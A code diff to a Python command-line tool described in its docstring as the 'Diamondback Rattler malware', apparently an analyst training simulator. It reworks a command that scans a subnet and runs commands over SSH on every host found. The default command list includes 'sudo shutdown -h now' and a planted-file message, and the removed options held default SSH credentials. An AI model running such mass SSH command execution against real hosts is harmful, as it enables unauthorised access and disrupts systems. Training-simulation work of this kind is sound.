@@ -210,10 +210,6 @@ def diamondback_client(ctx, configuration, quiet, debug, home, light, password, 
 @diamondback_client.command(help="Simple helper to start operation for training")
 @click.option('--network', '-n', default='10.0.10.0/24', 
               help='Network range to scan (CIDR notation)')
-@click.option('--username', '-u', default='sysadmin', 
-              help='SSH username')
-@click.option('--password', '-p', default='password', 
-              help='SSH password')
 @click.option('--commands', '-c', multiple=True, 
               default=['hostname', 'sudo shutdown -h now', 'whoami', 'date', 'ps aux | head -5', 'echo "the hacker D1@m0ndB@ck was here" >> suspicious_file.txt'],
               help='Commands to execute on discovered hosts')
@@ -224,15 +220,12 @@ def diamondback_client(ctx, configuration, quiet, debug, home, light, password, 
 @click.option('--hosts', multiple=True,
               help='Specific hosts to scan (if skip-discovery is set)')
 @click.pass_context
-def basic(ctx, network, username, password, commands, port, skip_discovery, hosts):
+def basic(ctx, network, commands, port, skip_discovery, hosts):
     """
     basic functionality for the Diamondback Rattler malware. This should execute
     simple remote actions that a junior or entry-level analyst can spot with some 
     minor hand-holding. This should run until the user presses CTRL-C to cancel. 
     """
-    ctx.obj['USERNAME'] = username
-    ctx.obj['PASSWORD'] = password
-
     if ctx.obj['CONFIGURATION']:
         logger.info( 'initialize diamondback instance with context' )
         d = Diamondback( ctx )
@@ -241,30 +234,31 @@ def basic(ctx, network, username, password, commands, port, skip_discovery, host
         d = Diamondback()
 
     try:
-        # Step 3: Execute commands on SSH-accessible hosts using multiprocessing
-        if commands and click.confirm("\nExecute commands on discovered hosts?"):
-            click.echo(f"\nExecuting commands on {len(ssh_hosts)} hosts...")
-            click.echo(f"Commands to execute: {list(commands)}\n")
+        d.run( )
+        # # Step 3: Execute commands on SSH-accessible hosts using multiprocessing
+        # if commands and click.confirm("\nExecute commands on discovered hosts?"):
+        #     click.echo(f"\nExecuting commands on {len(ssh_hosts)} hosts...")
+        #     click.echo(f"Commands to execute: {list(commands)}\n")
             
-            # Create a process for each host
-            processes = []
-            for host in ssh_hosts:
-                process = multiprocessing.Process(
-                    target=execute_commands_on_host,
-                    args=(host, username, password, list(commands), port)
-                )
-                process.start()
-                processes.append(process)
+        #     # Create a process for each host
+        #     processes = []
+        #     for host in ssh_hosts:
+        #         process = multiprocessing.Process(
+        #             target=execute_commands_on_host,
+        #             args=(host, username, password, list(commands), port)
+        #         )
+        #         process.start()
+        #         processes.append(process)
             
-            # Wait for all processes to complete
-            for process in processes:
-                process.join()
+        #     # Wait for all processes to complete
+        #     for process in processes:
+        #         process.join()
             
-            click.echo("\n✓ Command execution completed on all hosts")
+        #     click.echo("\n✓ Command execution completed on all hosts")
         
         # Return the list of SSH-accessible hosts
-        click.echo(f"\n📋 Summary: {len(ssh_hosts)} accessible hosts found")
-        return ssh_hosts
+        #click.echo(f"\n📋 Summary: {len(ssh_hosts)} accessible hosts found")
+        return None
     except PermissionError:
         click.echo("\n❌ Error: This script requires root/administrator privileges "
                   "for network scanning.", err=True)
